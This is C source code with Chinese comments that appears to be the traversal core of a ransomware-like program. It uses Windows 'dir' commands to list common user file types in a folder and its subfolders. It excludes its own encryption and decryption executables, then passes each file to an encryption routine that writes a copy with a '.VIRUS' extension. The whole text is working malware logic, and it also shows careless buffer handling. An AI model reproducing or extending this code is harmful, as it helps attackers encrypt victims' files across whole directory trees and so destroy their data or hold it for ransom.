void file_search(char *MainPosition);
void file_read(char *MainPosition);
void folder_search(char *MainPosition);

int frequency = 0;

void file_search(char *MainPosition){
    if(frequency == 0){
        system("dir /B *.exe *.txt *.docx *.jpg *.gif *.pdf *.zip *.png *.mp4 *.xls *.pptx *.mp3 *.msi *.bmp *.odg >> original_file_name.txt"); //需再加

        FILE *original_file_name_read, *processed_original_file_name_read; // 1)用來讀取original_file_name.txt 2)用來讀取processed_original_file_name.txt
        original_file_name_read = fopen("original_file_name.txt", "r");
        processed_original_file_name_read = fopen("processed_original_file_name.txt", "w");

        char file_name[500]; //儲存檔案名稱
        while(fgets(file_name, sizeof(file_name), original_file_name_read) != NULL){
        if(strncmp("encryption_program.exe", file_name, 22) != 0 && strncmp("decryption_program.exe", file_name, 22) != 0 && strncmp("original_file_name.txt", file_name, 22) != 0){
            fputs(file_name, processed_original_file_name_read);
        }
        }
        fclose(original_file_name_read);
        fclose(processed_original_file_name_read);
        remove("original_file_name.txt");
    }
    else{
        char file[500] = "cd "; //收集子資料夾的檔案用
        strcat(file, MainPosition);
        strcat(file, " && dir /B *.exe *.txt *.docx *.jpg *.gif *.pdf *.zip *.png *.mp4 *.xls *.pptx *.mp3 *.msi *.bmp *.odg >> original_file_name.txt");
        system(file);

        char file2[500]; //幫助processed_original_file_name_read和processed_original_file_name_read讀取檔案
        FILE *original_file_name_read, *processed_original_file_name_read; // 1)用來讀取子資料夾的original_file_name.txt 2)用來讀取子資料夾的processed_original_file_name.txt
        strcpy(file2, MainPosition);
        strcat(file2, "\\original_file_name.txt");
        original_file_name_read = fopen(file2, "r");
        strcpy(file2, MainPosition);
        strcat(file2, "\\processed_original_file_name.txt");
        processed_original_file_name_read = fopen(file2, "w");

        char file_name[500]; //儲存檔案名稱
        while(fgets(file_name, sizeof(file_name), original_file_name_read) != NULL){
        if(strncmp("original_file_name.txt", file_name, 22) != 0){
            fputs(file_name, processed_original_file_name_read);
        }
        }
        fclose(original_file_name_read);
        fclose(processed_original_file_name_read);
        strcpy(file2, MainPosition);
        strcat(file2, "\\original_file_name.txt");
        remove(file2);
        file_read(MainPosition);
    }
}

void file_read(char *MainPosition){
    FILE *processed_original_file_name_read; //用來讀取主資料夾或子資料夾的processed_original_file_name.txt
    char processed_original_file_name[500]; //儲存除理過的原始檔名
    if(frequency == 0){
        processed_original_file_name_read = fopen("processed_original_file_name.txt", "r");
        while(fgets(processed_original_file_name, sizeof(processed_original_file_name), processed_original_file_name_read) != NULL){
        char encryption_file_name[500] = ""; //儲存加密的檔名
        strtok(processed_original_file_name, "\n");
        strcat(encryption_file_name, processed_original_file_name);
        strcat(encryption_file_name, ".VIRUS");
        encryption(processed_original_file_name, encryption_file_name);
        }
        fclose(processed_original_file_name_read);
        frequency++;
        folder_search(MainPosition);
    }
    else{
        char file[500]; //幫助processed_original_file_name_read讀取檔案
        strcat(processed_original_file_name, MainPosition);
        strcat(processed_original_file_name, "\\");
        strcpy(file, MainPosition);
        strcat(file, "\\processed_original_file_name.txt");
        processed_original_file_name_read = fopen(file, "r");
        char excessive_string[500]; //中間轉換用
        while(fgets(excessive_string, sizeof(excessive_string), processed_original_file_name_read) != NULL){
        strcpy(processed_original_file_name, MainPosition);
        strcat(processed_original_file_name, "\\");
        char encryption_file_name[500];
        strcpy(encryption_file_name, MainPosition);
        strcat(encryption_file_name, "\\");
        strtok(excessive_string, "\n");
        strcat(encryption_file_name, excessive_string);
        strcat(processed_original_file_name, excessive_string);
        strcat(encryption_file_name, ".VIRUS");
        encryption(processed_original_file_name, encryption_file_name);
        }
        fclose(processed_original_file_name_read);
        remove(file);
        folder_search(MainPosition);
    }
}

void folder_search(char *MainPosition){
    strtok(MainPosition, "\n");
    char folder[500] = "cd "; //幫助尋找子資料夾
    strcat(folder, MainPosition);
    strcat(folder, " && dir /AD /B >> folder.txt");
    system(folder);
    strcpy(folder, "");
    strcat(folder, MainPosition);
    strcat(folder, "\\folder.txt");
    FILE *folder_name_read; //讀取folder.txt
    folder_name_read = fopen(folder, "r");
    char MainPosition_copy[500]; //複製MainPosition
    strcpy(MainPosition_copy, MainPosition);
    char folder_name[500]; //儲存子資料夾名稱
    while(fgets(folder_name, sizeof(folder_name), folder_name_read) != NULL){
        strtok(folder_name, "\n");
        strcat(MainPosition, "\\");
        strcat(MainPosition, folder_name);
        file_search(MainPosition);
        strcpy(MainPosition, MainPosition_copy);
    }
    fclose(folder_name_read);
    remove(folder);
}
